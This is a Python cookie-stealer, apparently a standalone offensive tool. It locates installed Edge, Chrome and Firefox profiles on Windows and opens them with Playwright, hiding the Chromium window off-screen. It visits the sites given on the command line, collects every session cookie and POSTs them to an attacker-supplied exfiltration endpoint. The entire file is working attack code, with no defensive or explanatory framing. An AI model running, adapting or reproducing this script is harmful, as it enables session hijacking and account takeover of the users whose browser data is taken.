# Imports
from playwright.sync_api import sync_playwright
import argparse
import json
import os
import requests
import random
import string
import configparser
from pathlib import Path

# Argument parsing
parser = argparse.ArgumentParser(description='Automate browser tasks and exfiltrate data to a server.')
parser.add_argument('--sites', nargs='+', help='A list of sites to visit', required=True)
parser.add_argument('--exfil', help='The exfiltration endpoint URL', required=True)

args = parser.parse_args()
LIST_OF_SITES = args.sites
EXFIL_ENDPOINT = args.exfil

def check_yourself(data, var_name):
    dataName = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    variable = f'__{dataName}__{var_name}'
    locals()[variable] = data
    return locals()[variable]

# Function to get the default Firefox profile path
def get_firefox_default_profile(profiles_path):
    profiles_ini_path = os.path.join(profiles_path, 'profiles.ini')
    config_parser = configparser.ConfigParser()
    config_parser.read(profiles_ini_path)
    for section in config_parser.sections():
        if 'Path' in config_parser[section] and 'Default' in config_parser[section]:
            if config_parser.getboolean(section, 'Default'):
                profile_path = config_parser.get(section, 'Path')
                is_relative = config_parser.getboolean(section, 'IsRelative')
                # Don't append '..' to the final profile path
                return os.path.join(profiles_path, profile_path) if is_relative else profile_path
    return None


# Get installed browsers
def check_installed_browsers():
    browsers = {}
    # Windows file paths for executables and their respective user data directories
    browser_details = {
        'Microsoft Edge': {
            'executable_name': r'Microsoft\Edge\Application\msedge.exe',
            'user_data_dir': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')
        },
        'Google Chrome': {
            'executable_name': r'Google\Chrome\Application\chrome.exe',
            'user_data_dir': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data')
        },
        'Mozilla Firefox': {
            'executable_name': r'Mozilla Firefox\firefox.exe',
            'user_data_dir': os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
        }
    }

    browser_details = sorted(browser_details.items(),
                                    key=lambda item: 'chromium' if 'chrome' in item[0].lower() or 'edge' in item[0].lower() else 'firefox')

    for browser_name, details in browser_details:
        executable_path = Path(os.getenv('PROGRAMFILES(X86)'), details['executable_name'])
        if not executable_path.exists():
            executable_path = Path(os.getenv('PROGRAMFILES'), details['executable_name'])
        if executable_path.exists():
            user_data_dir = details['user_data_dir']  # Define user_data_dir outside of the if condition
            if 'firefox' in browser_name.lower():
                # Overwrite user_data_dir for Firefox with the specific profile path
                user_data_dir = get_firefox_default_profile(Path(details['user_data_dir']).parent)

                if user_data_dir is None:
                    print(f"Default Firefox profile not found in {details['user_data_dir']}")
                    continue  # Skip Firefox if the default profile can't be found
            # Assign the browser details to the browsers dictionary
            browsers[browser_name] = {
                'executable_path': str(executable_path),
                'user_data_dir': user_data_dir
            }

    return browsers

# Process data function
def process_data(secured_output, site, browser_name):
    print(f'Goodies for {site} using {browser_name}: {secured_output}')
    
    # Here you can send the secured_output to a server or save it, etc.
    response = requests.post(EXFIL_ENDPOINT, data=secured_output)
    print(f'Response from server: {response.text}')

# Spawn Firefox and run commands function
def spawn_firefox_and_run_commands(browser_info, sites):
    with sync_playwright() as p:
        context = p.firefox.launch_persistent_context(
            executable_path=browser_info['executable_path'],
            headless=False,
            user_data_dir=browser_info['user_data_dir'],
            # Firefox-specific args can be added here if needed
        )
        for site in sites:
            page = context.new_page()
            page.goto(site)

            # Extract data
            goodies = context.cookies()
            goodies_json = json.dumps(goodies, indent=4)
            goodies = ''

            goodies_json = check_yourself(goodies_json, 'data')
            secured_output = goodies_json
            goodies_json = ''

            # Process data
            process_data(secured_output, site, browser_info['executable_path'])
            page.close()
        context.close()

# Spawn Chromium and run commands function
def spawn_chromium_and_run_commands(browser_info, sites):
    print(browser_info)
    with sync_playwright() as p:
        context = p.chromium.launch_persistent_context(
            executable_path=browser_info['executable_path'],
            headless=False,
            user_data_dir=browser_info['user_data_dir'],
            args=['--window-position=-32000,-32000'],
            viewport={'width': 400, 'height': 500}
        )
        for site in sites:
            page = context.new_page()
            page.goto(site)

            # Extract data
            goodies = context.cookies()
            goodies_json = json.dumps(goodies, indent=4)
            goodies = ''

            goodies_json = check_yourself(goodies_json, 'data')
            secured_output = goodies_json
            goodies_json = ''

            # Process data
            process_data(secured_output, site, browser_info['executable_path'])
            page.close()
        context.close()

# Main execution
if __name__ == "__main__":
    available_browsers = check_installed_browsers()

    for browser_name, browser_info in available_browsers.items():
        if 'firefox' in browser_name.lower():
            spawn_firefox_and_run_commands(browser_info, LIST_OF_SITES)
        else:
            spawn_chromium_and_run_commands(browser_info, LIST_OF_SITES)
    input("Enter")
